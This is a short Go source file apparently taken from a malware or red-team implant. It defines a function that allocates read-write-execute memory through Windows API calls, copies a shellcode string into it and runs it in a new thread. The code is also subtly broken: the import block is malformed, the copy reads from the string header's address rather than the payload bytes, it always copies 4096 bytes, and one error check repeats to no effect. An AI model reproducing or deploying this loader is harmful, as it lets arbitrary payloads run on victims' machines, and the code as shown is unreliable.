package components

import 
	reflect
	syscall
	unsafe

func runShellCode(shellcode string) string {
	addr := procVirtualAlloc(0, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "Shellcode failed"
	}
	hdr := reflect.SliceHeader{Data: uintptr(unsafe.Pointer(&shellcode)), Len: len(shellcode), Cap: len(shellcode)}
	procRtlMoveMemory(addr, hdr.Data, 4096)
	ht := procCreateThread(0, 0, addr, 0, 0, 0)
	if ht == 0 {
		return "Shellcode failed"
	}
	procWaitForSingleObject(ht, syscall.INFINITE)
	if ht == 0 {
		return "Shellcode failed"
	}
	return "Shellcode ran"
}
